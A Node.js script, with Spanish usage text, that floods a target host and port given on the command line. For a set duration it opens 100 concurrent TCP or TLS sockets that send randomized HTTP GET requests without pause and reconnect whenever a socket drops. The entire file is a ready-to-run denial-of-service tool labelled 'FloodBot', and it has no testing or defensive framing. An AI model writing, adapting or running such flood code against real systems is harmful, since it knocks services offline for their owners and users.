const net = require("net");
const tls = require("tls");

const host = process.argv[2];
const port = parseInt(process.argv[3]);
const time = parseInt(process.argv[4]) * 1000;

if (!host || !port || !time) {
  console.log("Uso: node http-raw.js <host> <puerto> <tiempo_segundos>");
  process.exit();
}

const isHttps = (port === 443 || port === 8443);
const endTime = Date.now() + time;
const CONCURRENT_SOCKETS = 100; // Ajustable

function randomPath() {
  return "/" + Math.random().toString(36).substring(2, 10);
}

function buildHeaders() {
  return [
    `GET ${randomPath()} HTTP/1.1`,
    `Host: ${host}`,
    `User-Agent: Mozilla/5.0 (FloodBot)`,
    `Accept: */*`,
    `Connection: keep-alive`,
    `X-Flood: ${Math.random()}`,
    ``,
    ``
  ].join("\r\n");
}

function flood() {
  if (Date.now() >= endTime) return;

  let socket;

  const connect = () => {
    if (Date.now() >= endTime) return;

    try {
      socket = isHttps
        ? tls.connect({ host, port, servername: host, rejectUnauthorized: false }, send)
        : net.connect(port, host, send);

      socket.setTimeout(1000);

      socket.on("error", () => socket.destroy());
      socket.on("timeout", () => socket.destroy());
      socket.on("close", () => setTimeout(connect, 10));
    } catch {
      setTimeout(connect, 100);
    }
  };

  const send = () => {
    if (Date.now() >= endTime || !socket || socket.destroyed) return;
    socket.write(buildHeaders());
    setImmediate(send);
  };

  connect();
}

// Lanzar múltiples conexiones
for (let i = 0; i < CONCURRENT_SOCKETS; i++) {
  flood();
}

console.log(`🚀 Flooding ${host}:${port} por ${time / 1000}s con ${CONCURRENT_SOCKETS} sockets...`);
